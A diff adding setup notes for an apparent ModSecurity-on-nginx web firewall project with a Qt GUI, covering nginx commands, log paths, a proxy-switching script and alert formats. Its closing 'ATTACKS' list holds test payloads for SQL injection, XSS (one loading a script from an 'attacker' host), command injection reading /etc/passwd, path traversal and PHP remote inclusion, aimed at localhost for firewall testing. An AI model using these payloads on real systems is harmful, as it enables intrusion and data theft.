@@ -1,0 +1,99 @@
+References:
+https://www.netnea.com/cms/nginx-modsecurity-tutorials/
+https://www.nginx.com/blog/compiling-and-installing-modsecurity-for-open-source-nginx/
+
+https://nginx.org/ru/docs/beginners_guide.html
+https://nginx.org/ru/docs/http/ngx_http_index_module.html
+https://ruhighload.com/%D0%9F%D1%80%D0%B0%D0%B2%D0%B8%D0%BB%D1%8C%D0%BD%D0%B0%D1%8F+%D0%BA%D0%BE%D0%BD%D1%84%D0%B8%D0%B3%D1%83%D1%80%D0%B0%D1%86%D0%B8%D1%8F+nginx
+
+QT (c++):
+https://losst.ru/ustanovka-qt-ubuntu-16-04
+
+http://doc.qt.io/qt-5/qmake-tutorial.html
+https://www.ibm.com/developerworks/ru/library/l-qt_1/index.html
+//----------------------------------------------------------------
+Scripts and files:
+/nginx/conf/nginx.conf
+
+sudo /nginx/sbin/nginx
+sudo /nginx/sbin/nginx -s stop
+ps -ax | grep nginx
+
+sudo /nginx/sbin/nginx -c /nginx/conf/nginx.conf
+
+/usr/src/modsecurity/modsecurity-v3.0.0/modsecurity.conf
+
+/nginx/conf/crs/crs-setup.conf
+
+/nginx/logs/error.log
+/nginx/logs/access.log
+/nginx/logs/modsec_audit.log - OK  /var/log/modsec_audit.log
+/nginx/logs/modsec_debug.log - not OK
+
+
+
+How to launch qtcreator:
+qtcreator
+
+How to launch the application:
+qmake /home/katze/Downloads/Security/GUI/Firewall.pro     (Makefile appeared)
+make
+./Firewall
+//----------------------------------------------------------------
+Tips and tricks:
+./mode.sh --ip 104.20.42.23 --add-prox
+Это использование - как сделать сервер проксёй для вот этого страшного айпишника
+./mode.sh --add-serv
+Вернуть к конфигурации, как в файле nginx-serv.conf
+Этот копирует nginx-proxy.conf в nginx.conf и заменяет айпишник.
+
+
+любые возвращения к обычному локалхосту делаются каким образом?
+./mode.sh --add-serv
+аааа
+вернуть к прежней в плане
+Ага. Именно так.
+Именно такая конфигурация лежит в nginx-serv.conf.
+
+
+Это формат логов: (log.sh)
+-----------------------------------------
+time = 2017/11/30 18:20:44 
+msg = Meta-Character Anomaly Detection Alert - Repetitive Non-Word Characters 
+client = 127.0.0.1 
+---------------------------------------— 
+time = 2017/11/30 18:20:44 
+msg = Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2) 
+client = 127.0.0.1
+
+
+Problems:
+Некоторые логи не выводятся (вне проекта)
+Даты файликов, в файликах и имена поменять
+
+
+https://www.owasp.org/index.php/Testing_for_Command_Injection_(OTG-INPVAL-013)
+
+http://sensitive/something.php?dir=%3Bcat%20/etc/passwd
+
+ATTACKS:
+http://localhost/cgi-bin/userData.pl?doc=/bin/ls
+http://localhost/gallery_zoom.php?Img_Cat_ID=\Nunion%20distinct%20select%201,2,3,4,5,6,7,8,9,{f%20version()},11,12,13,14,15,16--
+
+http://localhost/?var=%3CSCRIPT%20a=%22%3E%22%20SRC=%22http://attacker/xss.js%22%3E%3C/SCRIPT%3E
+http://localhost/index.php?user=<script>alert(123)</script>
+http://localhost/index.php?user=<script>window.onload = function() {var AllLinks=document.getElementsByTagName("a"); 
+AllLinks[0].href = "http://badexample.com/malicious.exe"; }</script> 
+XSS
+http://localhost/src/view_header.php?mailbox=INBOX&passed_id=46105&passed_ent_id=0
+IMAP/SMTP
+http://localhost/ldapsearch?user=*
+LDAP
+http://localhost/index.php?username=1'%20or%20'1'%20=%20'1&password=1'%20or%20'1'%20=%20'1 
+SQL
+http://localhost/product.php?id=10; INSERT INTO users (…)
+SQL
+http://localhost/scripts/..%c1%1c../winnt/system32/cmd.exe?/c+<command_to_execute>
+Application Firewall Bypass
+http://www.example.com/uptime.php?pin=http://www.example2.com/packx1/cs.jpg?&cmd=uname%20-a
+PHP Injection
